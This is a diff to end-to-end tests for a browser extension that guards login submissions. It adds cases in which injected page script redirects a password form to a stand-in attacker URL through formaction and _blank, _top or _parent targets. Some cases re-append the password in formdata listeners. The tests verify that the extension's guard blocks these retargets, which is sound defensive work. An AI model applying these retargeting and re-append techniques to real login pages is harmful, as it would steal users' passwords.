@@ -19,7 +19,7 @@ import os from "node:os";
 import path from "node:path";
 import { fileURLToPath } from "node:url";
 import { SUITE_SETTINGS_KEY } from "../../extension/src/shared/storage";
-import { clickModalButton, getServiceWorker, waitForCredentialModal, waitForToastText } from "./extension_test_utils";
+import { clickModalButton, getServiceWorker, waitForCredentialModal } from "./extension_test_utils";
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -43,6 +43,9 @@ type Retarget =
   | "window-capture-hidden"
   | "formdata-synthetic-reset"
   | "submit-formaction-top"
+  | "submit-formaction-parent"
+  | "submit-formaction-blank-reappend"
+  | "submit-formaction-top-reappend"
   | "submit-formaction-blank"
   | "formdata-action";
 type Sinks = { approved: string[]; attacker: string[]; resumedSubmits: number };
@@ -141,6 +144,10 @@ async function installRetarget(page: Page | Frame, mode: Retarget): Promise<void
           base.href = new URL("/", attacker).href;
           document.head.appendChild(base);
         }
+        if (mode === "submit-formaction-blank-reappend") {
+          go.setAttribute("formaction", attacker);
+          go.setAttribute("formtarget", "_blank");
+        }
         if (mode === "submit-formaction-blank") {
           go.setAttribute("formaction", attacker);
           go.setAttribute("formtarget", "_blank");
@@ -159,11 +166,23 @@ async function installRetarget(page: Page | Frame, mode: Retarget): Promise<void
           true,
         );
       }
-      if (mode === "submit-formaction-top") {
+      if (mode.startsWith("submit-formaction-top") || mode === "submit-formaction-parent") {
         form.addEventListener("submit", () => {
           go.setAttribute("formaction", attacker);
-          go.setAttribute("formtarget", "_top");
+          go.setAttribute("formtarget", mode === "submit-formaction-parent" ? "_parent" : "_top");
         });
+      }
+      if (mode.endsWith("-reappend")) {
+        // #1103 review: put the password back after the guard empties the entry
+        // list, from every listener position a page can take.
+        const reappend = (event: Event): void => {
+          const password = (document.getElementById("password") as HTMLInputElement).value;
+          (event as FormDataEvent).formData.append("password", password);
+        };
+        window.addEventListener("formdata", reappend, true);
+        document.addEventListener("formdata", reappend, true);
+        form.addEventListener("formdata", reappend);
+        window.addEventListener("formdata", reappend);
       }
       if (mode === "formdata-synthetic-reset") {
         // Review round 1 on #1100: move the destination in submit, then, after
@@ -228,20 +247,36 @@ for (const mode of ["submit-formaction", "submit-action", "submit-base", "window
   });
 }
 
-test("silent allow: a retarget into a new window is a known gap (#1084) @regression", async () => {
+test("silent allow: a retarget into a new window POSTs no form data (#1099) @regression", async () => {
   test.skip(!fs.existsSync(extensionPath), "Build the extension before running e2e tests.");
   // Measured in Chromium: once the browser has chosen a new (_blank) window for
-  // the POST, neither window.stop() nor disconnecting the form cancels it, and
-  // the isolated world has no hook between the page's last submit listener and
-  // that choice. Flip this when the follow-up keeps the resumed submit away from
-  // page listeners.
-  test.fail();
+  // the POST, neither window.stop() nor disconnecting the form cancels it. The
+  // guard empties the submission's entry list at formdata instead, so the new
+  // window's POST carries nothing, then re-checks the moved destination.
   await withVictimPage(false, async (page, sinks) => {
     await installRetarget(page, "submit-formaction-blank");
     await page.click("#go", { noWaitAfter: true });
     await expect.poll(() => sinks.resumedSubmits, { timeout: 10_000 }).toBe(1);
-    await page.waitForTimeout(2_000);
-    expect(sinks.attacker).toEqual([]);
+    await expect.poll(() => sinks.attacker, { timeout: 10_000 }).toEqual([`POST ${ATTACKER_URL} `]);
+    expect(sinks.approved).toEqual([]);
+    await waitForCredentialModal(page);
+    await clickModalButton(page, "Cancel");
+    await page.waitForTimeout(1_000);
+    expect(sinks.attacker, "only the emptied POST reached the attacker").toEqual([`POST ${ATTACKER_URL} `]);
+    expect(sinks.approved).toEqual([]);
+  });
+});
+
+test("silent allow: a new-window retarget whose page formdata listeners re-append the password POSTs no form data (#1103 review) @regression", async () => {
+  test.skip(!fs.existsSync(extensionPath), "Build the extension before running e2e tests.");
+  await withVictimPage(false, async (page, sinks) => {
+    await installRetarget(page, "submit-formaction-blank-reappend");
+    await page.click("#go", { noWaitAfter: true });
+    await expect.poll(() => sinks.resumedSubmits, { timeout: 10_000 }).toBe(1);
+    await expect.poll(() => sinks.attacker, { timeout: 10_000 }).toEqual([`POST ${ATTACKER_URL} `]);
+    await page.waitForTimeout(1_000);
+    expect(sinks.attacker).toEqual([`POST ${ATTACKER_URL} `]);
+    expect(sinks.approved).toEqual([]);
   });
 });
 
@@ -303,33 +338,35 @@ test("a synthetic formdata cannot clear a moved resumed submit (#1100 review) @r
   await withVictimPage(false, async (page, sinks) => {
     await installRetarget(page, "formdata-synthetic-reset");
     await page.click("#go", { noWaitAfter: true });
-    await expect.poll(() => sinks.resumedSubmits, { timeout: 10_000 }).toBeGreaterThanOrEqual(1);
-    await page.waitForTimeout(2_000);
-    expect(sinks.attacker, "the attacker sink must receive zero canary POSTs").toEqual([]);
-    // The re-check assesses the reset (approved) URL, the page moves it again on
-    // the next resume, and the second move blocks.
-    await waitForToastText(page, "destination changed after the security check");
-    expect(sinks.attacker).toEqual([]);
-    expect(sinks.approved).toEqual([]);
+    // #1103 review: the guard stops a moved submission's formdata before any page
+    // listener, so the page never gets to reset and replay; the re-check then
+    // prompts for the attacker host and Cancel sends nothing.
+    await expectNoAttackerPost(page, sinks);
   });
 });
 
-test("a framed login retargeted to _top during the resumed submit (#1100 review, measurement) @regression", async () => {
-  test.skip(!fs.existsSync(extensionPath), "Build the extension before running e2e tests.");
-  // Measured: the POST is scheduled on the top frame, so the iframe's
-  // window.stop() does not cancel it. Same class as the new-window gap (#1099).
-  test.fail();
-  await withVictimPage(false, async (page, sinks) => {
-    await page.goto(TOP_URL, { waitUntil: "domcontentloaded" });
-    const frame = page.frameLocator("#login");
-    await expect(frame.locator("#go")).toBeVisible();
-    const login = page.frames().find((f) => f.url() === LOGIN_URL);
-    expect(login).toBeTruthy();
-    await page.waitForTimeout(300);
-    await installRetarget(login!, "submit-formaction-top");
-    await frame.locator("#go").click({ noWaitAfter: true });
-    await expect.poll(() => sinks.resumedSubmits, { timeout: 10_000 }).toBe(1);
-    await page.waitForTimeout(2_000);
-    expect(sinks.attacker, "the attacker sink must receive zero canary POSTs").toEqual([]);
+for (const target of ["_top", "_parent", "_top with re-append"] as const) {
+  test(`a framed login retargeted to ${target} during the resumed submit POSTs no form data (#1099) @regression`, async () => {
+    test.skip(!fs.existsSync(extensionPath), "Build the extension before running e2e tests.");
+    // The POST is scheduled on the parent frame, so the iframe's window.stop()
+    // does not cancel it; the guard empties the entry list at formdata instead.
+    await withVictimPage(false, async (page, sinks) => {
+      await page.goto(TOP_URL, { waitUntil: "domcontentloaded" });
+      const frame = page.frameLocator("#login");
+      await expect(frame.locator("#go")).toBeVisible();
+      const login = page.frames().find((f) => f.url() === LOGIN_URL);
+      expect(login).toBeTruthy();
+      await page.waitForTimeout(300);
+      await installRetarget(
+        login!,
+        target === "_top" ? "submit-formaction-top" : target === "_parent" ? "submit-formaction-parent" : "submit-formaction-top-reappend",
+      );
+      await frame.locator("#go").click({ noWaitAfter: true });
+      await expect.poll(() => sinks.resumedSubmits, { timeout: 10_000 }).toBe(1);
+      await expect.poll(() => sinks.attacker, { timeout: 10_000 }).toEqual([`POST ${ATTACKER_URL} `]);
+      await page.waitForTimeout(2_000);
+      expect(sinks.attacker, "the attacker sink must receive no form data").toEqual([`POST ${ATTACKER_URL} `]);
+      expect(sinks.approved).toEqual([]);
+    });
   });
-});
+}
